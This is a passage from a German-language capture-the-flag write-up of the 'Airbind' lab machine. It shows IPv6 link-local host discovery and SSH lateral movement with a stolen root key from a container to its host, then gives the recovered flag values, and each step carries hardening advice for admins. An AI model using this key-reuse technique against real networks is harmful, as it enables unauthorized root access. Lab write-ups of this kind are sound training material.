+                    <div class="prompt">root@ubuntu:~/.ssh# <span class="command">ip route show</span></div>
+                    <pre>
+default via <span class="command">10.0.3.1</span> dev eth0 proto static 
+<span class="command">10.0.3.0/24</span> dev eth0 proto kernel scope link src 10.0.3.241 
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Erneuter `ping6`-Versuch vom Angreifer-System, diesmal an die korrekte Link-Local All-Nodes Multicast-Adresse `ff02::1`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan ist erfolgreich und enthüllt mehrere IPv6-fähige Hosts im lokalen Netzwerk anhand ihrer Link-Local-Adressen (`fe80::...%eth0`):
+                *   `fe80::a00:27ff:fe30:2eda`: Das eigene Angreifer-System.
+                *   `fe80::a00:27ff:fedc:2a3b`: Das ursprüngliche Zielsystem `airbinds.hmv` (MAC: `08:00:27:dc:2a:3b`).
+                *   `fe80::1`: Wahrscheinlich das Default-Gateway (`192.168.2.1`).
+                *   `fe80::6f7:78ff:feda:acf3`: Ein unbekannter Host.
+                *   `fe80::8247:86ff:fe96:f63a`: Ein weiterer unbekannter Host.
+                *   `fe80::ccf4:81ff:fe80:c5d4`: Noch ein unbekannter Host.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen IPv6 Link-Local-Adressen, insbesondere `fe80::a00:27ff:fedc:2a3b` (das Airbind-Hostsystem) und die unbekannten Hosts, sind potenzielle Ziele. Versuchen, sich per SSH mit dem gefundenen Root-Schlüssel auf diesen Hosts anzumelden.<br><strong>Empfehlung (Admin):</strong> IPv6-Sicherheit berücksichtigen. Ungenutzte IPv6-Stacks deaktivieren. IPv6-Firewall-Regeln implementieren. Link-Local-Adressen können für Angriffe innerhalb des lokalen Segments genutzt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/home/ddd/Downloads]<br>└─# <span class="command">ping6 -I eth0 ff02::1</span></div>
+                    <pre>
+ping6: Warning: IPv6 link-local address on ICMP datagram socket may require ifname or scope-id => use: address%<ifname|scope-id>
+ping6: Warning: source address might be selected on device other than: eth0
+PING ff02::1 (ff02::1) from :: eth0: 56 data bytes
+64 bytes from <span class="command">fe80::a00:27ff:fe30:2eda%eth0</span>: icmp_seq=1 ttl=64 time=0.032 ms
+64 bytes from <span class="command">fe80::a00:27ff:fedc:2a3b%eth0</span>: icmp_seq=1 ttl=255 time=0.443 ms
+64 bytes from <span class="command">fe80::1%eth0</span>: icmp_seq=1 ttl=255 time=0.827 ms
+64 bytes from <span class="command">fe80::6f7:78ff:feda:acf3%eth0</span>: icmp_seq=1 ttl=64 time=2.82 ms
+64 bytes from <span class="command">fe80::8247:86ff:fe96:f63a%eth0</span>: icmp_seq=1 ttl=255 time=68.6 ms
+64 bytes from <span class="command">fe80::ccf4:81ff:fe80:c5d4%eth0</span>: icmp_seq=1 ttl=255 time=297 ms 
+</pre>
+                 </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich vom Angreifer-System per SSH mit dem zuvor gefundenen Root-Schlüssel (`-i id_rsa`) auf zwei der per IPv6 entdeckten Hosts anzumelden.
+                *   Erster Versuch: `ssh -i id_rsa root@fe80::6f7:78ff:feda:acf3%eth0 -v` (mit Verbose-Modus `-v`).
+                *   Zweiter Versuch: `ssh -i id_rsa root@fe80::a00:27ff:fedc:2a3b%eth0`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   Der erste Versuch (auf `fe80::6f7:...`) scheitert mit `Connection refused`. Auf diesem Host läuft kein SSH-Server auf Port 22 oder die Verbindung wird blockiert.
+                *   Der zweite Versuch (auf `fe80::a00:27ff:fedc:2a3b`, die Link-Local-Adresse des ursprünglichen Airbind-Systems) ist erfolgreich! Nach Bestätigung des Host-Keys wird der Pentester als `root@airbind` angemeldet. Dies stellt ein erfolgreiches Lateral Movement dar, vom Ubuntu-Container (wo Root erlangt wurde) zum Host-System `airbind`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erfolg! Man befindet sich nun als Root auf dem Hostsystem `airbind`. Das System untersuchen (`ifconfig`, `ip route show`, `ls /root` etc.), um die Umgebung zu verstehen und die Root-Flag zu finden.<br><strong>Empfehlung (Admin):</strong> SSH-Zugriff auf Hostsysteme einschränken. Wenn möglich, Root-Login per SSH verbieten (`PermitRootLogin no` in `sshd_config`) und Key-basierte Authentifizierung für reguläre Benutzer erzwingen. Den privaten Schlüssel des kompromittierten Ubuntu-Containers als kompromittiert betrachten und von allen `authorized_keys`-Dateien entfernen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/home/ccat/Downloads]<br>└─# <span class="command">ssh -i id_rsa root@fe80::6f7:78ff:feda:acf3%eth0 -v</span></div>
+                    <pre>
+OpenSSH_9.7p1 Debian-7, OpenSSL 3.2.2 4 Jun 2024
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: Reading configuration data /etc/ssh/ssh_config.d/20-systemd-ssh-proxy.conf
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to fe80::6f7:78ff:feda:acf3%eth0 [fe80::6f7:78ff:feda:acf3%eth0] port 22.
+<span class="password">debug1: connect to address fe80::6f7:78ff:feda:acf3%eth0 port 22: Connection refused</span>
+<span class="password">ssh: connect to host fe80::6f7:78ff:feda:acf3%eth0 port 22: Connection refused</span>
+</pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/home/ccat/Downloads]<br>└─# <span class="command">ssh -i id_rsa root@fe80::a00:27ff:fedc:2a3b%eth0</span></div>
+                    <pre>
+The authenticity of host 'fe80::a00:27ff:fedc:2a3b%eth0 (fe80::a00:27ff:fedc:2a3b%eth0)' can't be established.
+ED25519 key fingerprint is SHA256:La9YyHs4GERVO8XTRRw0cLh6XcInXX35Ar9OiMsXwQk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'fe80::a00:27ff:fedc:2a3b%eth0' (ED25519) to the list of known hosts.
+Linux airbind 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+<span class="password">root@airbind:~#</span> 
+</pre>
+                 </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Hostsystem `airbind` werden die Netzwerkkonfiguration und die Routing-Tabelle überprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   `ifconfig`: Zeigt das Interface `enp0s3` mit der IPv4-Adresse `192.168.2.106` und der IPv6 Link-Local-Adresse `fe80::a00:27ff:fedc:2a3b` sowie einer globalen IPv6-Adresse.
+                *   `ip route show`: Zeigt das Default-Gateway `192.168.2.1` für IPv4. Interessanterweise zeigt es auch das interne LXC/Docker-Netzwerk `10.0.3.0/24` über das Interface `lxcbr0` (wo das Ubuntu-System läuft) und ein weiteres Netzwerk `192.168.10.0/24` über `wlan1`.
+            Dies bestätigt, dass wir uns auf dem Host befinden, der den Ubuntu-Container und möglicherweise weitere Netzwerkschnittstellen verwaltet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Netzwerkstruktur verstehen. Das `lxcbr0`-Interface und das `wlan1`-Interface könnten weitere Angriffspunkte oder Informationsquellen sein. Nach der Root-Flag suchen.<br><strong>Empfehlung (Admin):</strong> Hostsysteme härten. Zugriff auf Management-Interfaces (wie `lxcbr0`) einschränken. Unnötige Interfaces (wie `wlan1`, falls nicht benötigt) deaktivieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt als root@airbind -->
+                    <div class="prompt">root@airbind:~# <span class="command">ifconfig</span></div>
+                    <pre>
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet <span class="command">192.168.2.106</span>  netmask 255.255.255.0  broadcast 192.168.2.255
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        inet6 <span class="command">fe80::a00:27ff:fedc:2a3b</span>  prefixlen 64  scopeid 0x20<link>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        inet6 2003:d4:c71f:d323:a00:27ff:fedc:2a3b  prefixlen 64  scopeid 0x0<global>
+        ether 08:00:27:dc:2a:3b  txqueuelen 1000  (Ethernet)
+        RX packets 8079619  bytes 1282782134 (1.1 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8021464  bytes 3820678643 (3.5 GiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</pre>
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@airbind:~# <span class="command">ip route show</span></div>
+                    <pre>
+default via <span class="command">192.168.2.1</span> dev enp0s3 
+<span class="command">10.0.3.0/24</span> dev lxcbr0 proto kernel scope link src 10.0.3.1 
+169.254.0.0/16 dev wlan1 scope link metric 1000 
+<span class="command">192.168.2.0/24</span> dev enp0s3 proto kernel scope link src 192.168.2.106 
+<span class="command">192.168.10.0/24</span> dev wlan1 proto kernel scope link src 192.168.10.1 
+</pre>
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Prompt als root@ubuntu -->
+                     <div class="prompt">root@ubuntu:~/.ssh#  <span class="command">ip route show</span></div>
+                    <pre>
+default via <span class="command">10.0.3.1</span> dev eth0 proto static 
+<span class="command">10.0.3.0/24</span> dev eth0 proto kernel scope link src 10.0.3.241 
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `root` auf dem Hostsystem `airbind` wird das Root-Home-Verzeichnis aufgelistet und der Inhalt der Datei `root.txt` angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wird erfolgreich gefunden und lautet `<span class="password">2bd693135712f88726c22770278a2dcf</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag dokumentieren. Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Flags sicher speichern und Berechtigungen prüfen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@airbind:~# <span class="command">ls</span></div>
+                    <pre>
+<span class="command">root.txt</span>
+</pre>
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@airbind:~# <span class="command">cat root.txt</span></div>
+                    <pre>
+<span class="password" style="display: block; text-align: center;">2bd693135712f88726c22770278a2dcf</span>
+</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- HINWEIS: Die User-Flag stammt aus dem Ubuntu-Container (/root/user.txt), die Root-Flag vom Hostsystem (/root/root.txt) -->
+                <div class="code-block"><center>
+                    <div class="terminal">
+                        <span class="command">cat /root/user.txt (auf ubuntu)</span> <br>
+                        <span class="flag-content"><span class="password">4408f370877687429c6ab332e6f560d0</span></span>
+                    </div>
+                </center></div>
+
+                <div class="code-block"><center>
+                    <div class="terminal">
+                        <span class="command">cat /root/root.txt (auf airbind)</span> <br>
+                        <span class="flag-content"><span class="password">2bd693135712f88726c22770278a2dcf</span></span>
+                    </div>
+                 </center></div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 7. August 2024</p>
+    </footer>
+</body>
+</html>
